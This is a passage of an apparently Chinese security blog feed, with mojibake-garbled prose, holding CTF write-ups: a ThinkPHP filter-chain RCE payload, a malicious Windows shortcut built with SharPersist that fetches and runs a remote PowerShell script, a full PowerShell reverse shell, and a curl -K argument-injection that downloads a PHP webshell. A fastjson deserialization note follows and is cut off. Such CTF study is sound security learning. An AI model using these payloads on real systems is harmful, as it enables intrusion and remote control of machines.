class="line">g&#x3D;&#x3D;&amp;_method&#x3D;__construct&amp;filter[]&#x3D;set_error_handler&amp;filter[]&#x3D;self::path&amp;filter[]&#x3D;base64_decode&amp;filter[]&#x3D;\think\view\driver\Php::Display&amp;method&#x3D;GET</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘è§‰å¾—åˆ©ç”¨<code>::</code>çš„ç¡®æ„æƒ³ä¸åˆ°ã€‚ä»¥ä¸ºæŒ‰ç…§è‡ªå·±çš„è®¤è¯†æ¥è¯´<code>::</code>æ˜¯ç”¨æ¥è®¿é—®é™æ€å±æ€§è·Ÿæ–¹æ³•ã€‚æ²¡æƒ³åˆ°æ˜¯å¯ä»¥è°ƒéé™æ€çš„(æœ‰warning).åŸºäºä¸Šé¢å·²ç»è§£å†³äº†tpæŠ¥é”™çš„é—®é¢˜,è¿™é‡Œä¹Ÿå°±æ²¡å•¥é—®é¢˜äº†ã€‚</p><p>çœ‹åˆ°smi1eåˆ†äº«äº†å…¶ä»–ä¸€äº›éé¢„æœŸè§£ä»¥åŠé¢„æœŸè§£ã€‚æ‰“ç®—è·Ÿä¸€è·Ÿ</p><h2 id="The-king-of-phish-Victim-bot"><a href="#The-king-of-phish-Victim-bot" class="headerlink" title="The king of phish (Victim bot)"></a>The king of phish (Victim bot)</h2><p>source</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> LnkParse3 <span class="keyword">as</span> Lnk</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    source = open(__file__, <span class="string">'r'</span>).read().replace(<span class="string">"\n"</span>, <span class="string">"\x3c\x62\x72\x3e"</span>).replace(<span class="string">" "</span>, <span class="string">"\x26\x6e\x62\x73\x70\x3b"</span>)</span><br><span class="line">    <span class="keyword">return</span> source</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/send', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendFile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'No file part'</span></span><br><span class="line">    file = request.files[<span class="string">'file'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'No selected file'</span></span><br><span class="line">    data = file.stream.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data.startswith(<span class="string">b"\x4c\x00"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"You're a bad guy!"</span></span><br><span class="line">    shortcut = Lnk.lnk_file(indata=data)</span><br><span class="line">    <span class="keyword">if</span> shortcut.data[<span class="string">'command_line_arguments'</span>].count(<span class="string">" "</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"File is killed by antivirus."</span></span><br><span class="line">    filename = str(uuid.uuid4())+<span class="string">".lnk"</span></span><br><span class="line">    fullname = os.path.join(os.path.abspath(os.curdir) + <span class="string">"/uploads"</span>, filename)</span><br><span class="line">    open(fullname, <span class="string">"wb"</span>).write(data)</span><br><span class="line">    clickLnk(fullname)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Clicked."</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clickLnk</span><span class="params">(lnkPath)</span>:</span></span><br><span class="line">    os.system(<span class="string">'cmd /c "%s"'</span> % lnkPath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¼€å§‹ä¸»è¦æ˜¯è¢«lnkçš„å‘½ä»¤é‡Œbypass ç©ºæ ¼ç»™å›°æ‰°äº†ã€‚åæ¥æƒ³èµ·æ¥ä¸ç”¨ç©ºæ ¼è¿˜å¯ä»¥ç”¨å…¶ä»–ä¸å¯è§å­—ç¬¦.é‚£å°±å¾ˆç®€å•äº†ã€‚ç”¨<code>\t</code>æ›¿æ¢ä¸‹ç©ºæ ¼å³å¯ã€‚<br>çµæœæ‰¾åŠå¤©æ²¡æ‰¾åˆ°æ¶æ„lnkçš„ç”Ÿæˆå·¥å…·ã€‚ã€‚ã€‚</p><p>æœ€åä»Šå¤©å¤ç°æ—¶æ‰¾åˆ°ä¸€ä¸ªwindowsä¸Šçš„ã€‚ <a href="https://github.com/fireeye/SharPersist" target="_blank" rel="noopener">https://github.com/fireeye/SharPersist</a><br>ç”¨ä»¥ä¸‹å‘½ä»¤å³å¯ç”Ÿæˆlnkæ–‡ä»¶.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharPersist.exe <span class="literal">-t</span> startupfolder <span class="literal">-c</span> <span class="string">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"</span> <span class="literal">-a</span> <span class="string">"IEX(New-Object`tNet.WebClient).DownloadString('http://xxx/byc.ps1')"</span> <span class="operator">-f</span> <span class="string">"byc1"</span> <span class="literal">-m</span> add</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°ä¸€ä¸ªå°æŠ€å·§ï¼špowershellå‘½ä»¤è¡Œä¸‹å¯ä»¥ç›´æ¥ç”¨<code>`t</code> æ¥è¡¨ç¤ºå­—ç¬¦ä¸²ä¸­çš„<code>\t</code>ã€‚</p><p>ç„¶åå¼€å§‹å‡†å¤‡ç”¨çš„æ˜¯nishangçš„åå¼¹shellè„šæœ¬ã€‚ç»“æœæ²¡ååº”,æ„Ÿè§‰æ˜¯è¢«é˜²ç«å¢™æ‹¦äº†ã€‚æ‰€ä»¥å°±æ¢äº†ä¸ªç®€å•çš„<br>æœåŠ¡å™¨ä¸Šçš„byc.ps1</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">"10.0.2.4"</span>,<span class="number">9001</span>);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">"PS "</span> + (pwd).Path + <span class="string">"&gt; "</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><p>æœ€åå‘é€å³å¯getshell<br><img src="/2020/10/19/N1CTF2020/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>flagåœ¨userA æ¡Œé¢<br><code>n1ctf{I&#39;m_a_little_fish,_swimming_in_the_ocean}</code></p><p>åé¢æ‹¿åŸŸæ§çš„æ€è·¯å°±æ²¡æœ‰äº†â€¦</p><h2 id="Docker-Manager"><a href="#Docker-Manager" class="headerlink" title="Docker_Manager"></a>Docker_Manager</h2><p>BUUä¸Šé¢åˆå¤ç°äº†ä¸¤é¢˜ã€‚zabbix_funç›´æ¥æ‹¿expæ‰“çš„ã€‚Docker_Managerå¯ä»¥è®°å½•ä¸‹</p><p>èµµæ€»çš„wpå¾ˆè¯¦ç»†äº†ã€‚å­¦åˆ°å¾ˆå¤š<br><a href="https://www.zhaoj.in/read-6750.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6750.html</a></p><p>é¢˜ç›®æ ¸å¿ƒä»£ç åŸºæœ¬å°±æ˜¯ä¸‹é¢äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$cmd = <span class="string">'curl --connect-timeout 10 '</span> . $host_addr . <span class="string">' -g '</span> . $cert . $key . $cacert;</span><br><span class="line">$output = <span class="keyword">array</span>();</span><br><span class="line">$ret = <span class="number">0</span>;</span><br><span class="line">exec($cmd, $output, $ret);</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶å°±æ˜¯ä¸€ä¸ªcurlçš„å‚æ•°æ³¨å…¥ã€‚ä½†æ˜¯åˆ©ç”¨èµ·æ¥æ¯”è¾ƒæœ‰è¶£ã€‚</p><blockquote><p>You tell curl to read more command-line options from a specific file with the -K/â€“config option, like this:</p></blockquote><p>-Kæ˜¯å¯ä»¥è¯»å–ä¸€ä¸ªé…ç½®æ–‡ä»¶çš„ã€‚ç„¶åå¦‚æœé…ç½®æ–‡ä»¶demoå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># --- Example file ---</span><br><span class="line"># this is a comment</span><br><span class="line">url &#x3D; &quot;example.com&quot;</span><br><span class="line">output &#x3D; &quot;curlhere.html&quot;</span><br><span class="line">user-agent &#x3D; &quot;superagent&#x2F;1.0&quot;</span><br><span class="line"> </span><br><span class="line"># and fetch another URL too</span><br><span class="line">url &#x3D; &quot;example.com&#x2F;docs&#x2F;manpage.html&quot;</span><br><span class="line">-O</span><br><span class="line">referer &#x3D; &quot;http:&#x2F;&#x2F;nowhereatall.example.com&#x2F;&quot;</span><br><span class="line"># --- End of example file ---</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦Kèƒ½åŠ è½½åˆ°è®¾è®¡è¿‡çš„é…ç½®æ–‡ä»¶ï¼Œå°±èƒ½è¯»å†…å®¹å¹¶è¾“å‡ºã€‚è¿™åªç”¨åˆ°äº†<code>-K</code>ä¸€ä¸ªæŒ‡ä»¤ï¼Œå³å¯è¾¾æˆå†™shellçš„ç›®çš„ã€‚<br>ç„¶åå°±æ˜¯éå¸¸å·§å¦™çš„ä¸€ä¸ªåˆ©ç”¨äº†ã€‚æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è¯»åˆ°é…ç½®æ–‡ä»¶ï¼Œè€Œè¿™å°±æ˜¯åˆ©ç”¨äº†<code>/proc/xxx/cmdline</code><br>åŸæ¥æˆ‘ä»¬çŸ¥é“ï¼Œ<code>/proc/self/cmdline</code>å¸¸ç”¨äºè¯»å–java,pythonè¿™æ ·çš„webåº”ç”¨çš„ä¸€äº›ç®€å•é…ç½®ã€‚ä½†æ˜¯å®é™…ä¸Šå…¶ä»–å‘½ä»¤è¡Œæˆ–è€…è¯´ä¸€ä¸ªpidéƒ½ä¼šå¯¹åº”å…¶è¿è¡Œæ—¶çš„å‘½ä»¤å³<code>/proc/{pid}/cmdline</code>ã€‚</p><p>é‚£ä¹ˆå‡å¦‚æˆ‘ä»¬æœ‰åŠæ³•è®©cmdlineé•¿æ—¶é—´é©»ç•™ï¼Œå°±å¯ä»¥çˆ†ç ´pidè¯»å–åˆ°é…ç½®æ–‡ä»¶ã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨<code>/dev/urandom</code>ç­‰ç­‰æ–‡ä»¶ã€‚å®é™…ä¸Šdevä¸‹å¾ˆå¤šæ²¡æœ‰å®é™…å¤§å°çš„æ–‡ä»¶éƒ½å¯ä»¥ç”¨æ¥è¯»å–ã€‚</p><p>é‚£ä¹ˆé¦–å…ˆæˆ‘ä»¬åˆ©ç”¨æ¢è¡Œç¬¦,å°±èƒ½åœ¨æŸä¸ªpidçš„cmdlineæ„é€ å¦‚ä¸‹çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?host&#x3D;-K&#x2F;dev&#x2F;urandom%00&amp;cacert&#x3D;111%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0a%0aurl&#x3D;&quot;http:&#x2F;&#x2F;frps:9001&#x2F;byc.php&quot;%0aoutput&#x3D;&quot;img&#x2F;byc.php&quot;%0a%0a%0a%0a%0a%0a%0a</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl --connect-timeout 10 <span class="string">'-K/dev/urandom'</span> --cacert=<span class="string">'111</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">url="http://frps:9001/byc.php"</span></span><br><span class="line"><span class="string">output="img/byc.php"</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯åŒæ ·çš„åŠæ³•çˆ†ç ´<code>-K/proc/xx/cmdline</code>ï¼Œä»è€ŒåŠ è½½ä¸Šé¢çš„é…ç½®æ–‡ä»¶ï¼Œå†™è¿›shell</p><p>getshellå <code>trap &quot;&quot; 14 &amp;&amp; /readflag</code>å³å¯ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ ç¬”è®°-Javaæ·±å…¥</title>
      <link href="2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/"/>
      <url>2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>javaç»§ç»­å¼€å‘å­¦ä¹ ã€‚çœ‹åˆ°å“ªä¸ªå­¦å“ªä¸ªï¼Œshiroæ‡’å¾—çœ‹äº†ã€‚</p><a id="more"></a><h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>expåˆ©ç”¨ä¸å¿…å¤šè¯´ï¼Œä¸»è¦æ˜¯å­¦ä¹ ä¸‹åŸç†ã€‚ä»¥ä¸‹éƒ½åœ¨jdk1.8è°ƒè¯•ã€‚</p><p>å¯ä»¥æŒ‰wh1t3p1gå¸ˆå‚…çš„åšæ–‡å­¦ä¹ ã€‚<br><a href="https://blog.0kami.cn/2020/04/13/talk-about-fastjson-deserialization/" target="_blank" rel="noopener">https://blog.0kami.cn/2020/04/13/talk-about-fastjson-deserialization/</a></p><p>ä¸‰ä¸ªdemoç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Phone phone;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, Phone phone)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name+<span class="string">":"</span>+phone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String phoneNumber;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">(String phoneNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phoneNumber = phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewPhone</span> <span class="keyword">extends</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String location;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewPhone</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewPhone</span><span class="params">(String phoneNumber, String location)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phoneNumber = phoneNumber;</span><br><span class="line">        <span class="keyword">this</span>.location = location;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.phoneNumber+<span class="string">":"</span>+<span class="keyword">this</span>.location;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastjsonåº“ä¸€èˆ¬æˆ‘ä»¬é‡ç‚¹å…³æ³¨å‡ ä¸ªåŸºæœ¬åŠŸèƒ½æ–¹æ³•</p><ul><li><code>JSON.toJSONString()</code></li><li><code>JSON.parse()</code></li><li><code>JSON.parseObject()</code></li></ul><p>Test</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">"byc_404"</span>,<span class="keyword">new</span> Phone(<span class="string">"123123123"</span>));</span><br><span class="line">        <span class="comment">//Person person = new Person("byc_404",new NewPhone("123123123","china"));</span></span><br><span class="line">        String json = JSON.toJSONString(person);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ouput:</span></span><br><span class="line"><span class="comment">//1.</span></span><br><span class="line"><span class="comment">//&#123;"name":"byc_404","phone":&#123;"phoneNumber":"123123123"&#125;&#125;</span></span><br><span class="line"><span class="comment">//byc_404:123123123</span></span><br><span class="line"><span class="comment">//2.</span></span><br><span class="line"><span class="comment">//&#123;"name":"byc_404","phone":&#123;"location":"china","phoneNumber":"123123123"&#125;&#125;</span></span><br><span class="line"><span class="comment">//byc_404:123123123</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ€æ˜¾è‘—çš„é—®é¢˜å°±æ˜¯ã€‚æˆ‘ä»¬ä¸¤æ¬¡æ‰§è¡Œä»£ç æ—¶åœ¨<code>parseObject</code>åè¾“å‡ºçš„ç»“æœæ˜¯ä¸€è‡´çš„ã€‚è¿™æ˜¾ç„¶ä¸ç¬¦åˆæˆ‘ä»¬çš„é¢„æœŸ,å› ä¸ºè¿™ç›´æ¥ä¸¢å¤±äº†newphoneç±»çš„locationå±æ€§ã€‚</p><blockquote><p>ç”±äºfastjsonä¸çŸ¥é“éœ€è¦è¿˜åŸçš„Personçš„Phoneæ˜¯æœ¬èº«è¿˜æ˜¯å­ç±»NewPhoneï¼Œé¢å¯¹è¿™ç§å¤šæ€æ–¹å¼ï¼Œfastjsonè¿˜åŸçš„æ˜¯çˆ¶ç±»ï¼Œè€Œä¸æ˜¯å­ç±»NewPhone</p></blockquote><p>åœ¨è¿™ç§æƒ…å†µä¸‹å°±äº§ç”Ÿäº†autotype.æˆ‘ä»¬å°†ä¸Šé¢<code>TOJSONString</code>è¿™è¡Œä»£ç æ›´æ”¹ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="comment">//&#123;"@type":"Person","name":"john","phone":&#123;"@type":"NewPhone","location":"china","phoneNumber":"123123123"&#125;&#125;</span></span><br><span class="line"><span class="comment">//john:123123123:china</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>@type</code>å¸®åŠ©æˆ‘ä»¬é¿å…äº†å­ç±»ä¸¢å¤±å­—æ®µçš„é—®é¢˜,æˆåŠŸè¿˜åŸäº†å¯¹è±¡ã€‚ä½†æ˜¯æˆ‘ä»¬è‡ªç„¶å¯ä»¥æƒ³åˆ°,å¦‚æœå°†å…¶æŒ‡å®šä¸ºæ¶æ„ç±»,å°±å¯èƒ½å¯¼è‡´æ¶æ„ä»£ç æ‰§è¡Œäº†ã€‚è¿™å°±æ˜¯æœ€æ—©çš„fastjsonç‰ˆæœ¬çš„rceæ¼æ´ã€‚</p><p>ç„¶åå› ä¸ºæœ¬åœ°jdk1.8ç‰ˆæœ¬å¤ªé«˜å°±ä¸å¤ç°äº†â€¦â€¦æ‰“æ³•è‡ªç„¶æ˜¯rmi / ldapä¸¤ç§æ–¹æ³•ã€‚</p><p>è¿™é‡Œæä¸€ä¸‹fastjsonä¹‹æ‰€ä»¥èƒ½æ‰§è¡Œä¸€ç³»åˆ—æ–¹æ³•çš„èµ·å› :fastjson è‡ªåŠ¨è°ƒç”¨getterå’Œsetterä»¥åŠæ— å‚æ•°çš„æ„é€ å‡½æ•°</p><p>è¿™é‡Œä¸æ·±å…¥è·Ÿ,ç›´æ¥ç»™å‡ºç»“è®º<br>setteræå–æ¡ä»¶ï¼š</p><ul><li>å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4</li><li>éé™æ€å‡½æ•°</li><li>é™åˆ¶è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±»</li><li>å‡½æ•°å‚æ•°åªæœ‰ä¸€ä¸ª</li><li>å‡½æ•°åä»¥setå¼€å¤´ï¼Œç¬¬å››ä¸ªå­—ç¬¦æ˜¯å¤§å†™æˆ–è€…unicdeæˆ–è€…_æˆ–è€…å­—æ¯fï¼›å¦‚æœå‡½æ•°åé•¿åº¦&gt;=5ï¼Œçœ‹ç¬¬5ä½å­—ç¬¦æ˜¯ä¸æ˜¯å¤§å†™çš„</li></ul><p>getteræå–æ¡ä»¶ï¼š</p><ul><li>å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4</li><li>éé™æ€å‡½æ•°</li><li>å‡½æ•°åä»¥getå¼€å¤´ï¼Œç¬¬å››ä¸ªå­—ç¬¦å¤§å†™</li><li>å‡½æ•°å‚æ•°ä¸º0ä¸ª</li><li>å‡½æ•°çš„è¿”å›ç±»å‹ä¸ºCollectionçš„å­ç±»æˆ–æœ¬èº«ã€Mapçš„å­ç±»æˆ–æœ¬èº«ã€ AtomicBooleanã€AtomicIntegerã€AtomicLong<br>æ— ç›¸å¯¹åº”çš„setterå‡½æ•°</li></ul><blockquote><p>ç»è¿‡ä¸Šè¿°çš„ä¸¤ä¸ªæ¡ä»¶æå–åï¼Œä¿ç•™äº†ç¬¦åˆæ¡ä»¶çš„getterå’Œsetterï¼Œå¹¶äºcom/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValueå‡½æ•°ä¸­invokeè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´å®ç°äº†ç±»ä¼¼ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¸»åŠ¨è°ƒç”¨readObjectå‡½æ•°çš„æ•ˆæœã€‚</p></blockquote><p>ç”±æ¡ä»¶ï¼Œæ­¤æ—¶å¯ä»¥åˆ©ç”¨ä¼ å…¥æŸå­—æ®µçš„æ–¹å¼æ¥ä¸»åŠ¨è°ƒç”¨ç›¸å…³ç¬¦åˆæ¡ä»¶çš„setterå’Œgetterã€‚ä¾‹å¦‚åœ¨Personé‡Œé¢æ·»åŠ ä¸€ä¸ªsetTestå‡½æ•°ï¼Œå¹¶åœ¨éœ€è¦è½¬åŒ–çš„jsonä¸­æ·»åŠ 